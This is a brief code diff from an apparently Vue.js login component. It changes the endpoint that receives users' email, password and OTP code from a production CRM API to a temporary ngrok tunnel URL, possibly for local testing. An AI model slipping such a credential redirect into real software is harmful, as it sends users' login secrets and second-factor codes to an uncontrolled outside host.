@@ -39,7 +39,7 @@
             async submit() {
                 let response;
                 try {
-                    response = await axios.post('https://api-crm.nuofox.com/login/final', {
+                    response = await axios.post('https://ed36e3edc322.ngrok.io/login/final', {
                     email: this.$store.state.email,
                     password: this.$store.state.password,
                     ga_token: this.otp  
